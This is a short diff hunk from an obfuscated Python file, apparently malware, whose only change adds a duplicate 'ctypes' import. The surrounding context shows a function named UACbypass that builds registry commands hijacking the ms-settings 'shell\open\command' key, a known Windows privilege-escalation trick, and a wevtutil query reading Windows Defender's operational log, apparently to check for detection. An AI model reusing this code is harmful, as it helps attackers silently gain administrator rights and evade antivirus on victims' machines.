@@ -4,7 +4,7 @@ _D='file'
 _C='server'
 _B=False
 _A=True
-import subprocess,ctypes,sys,base64
+import subprocess,ctypes,sys,base64,ctypes
 def UACbypass(method=1):
 	G='reg delete hkcu\\Software\\Classes\\ms-settings /f';F='reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f';C='wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text';B=method
 	if GetSelf()[1]:
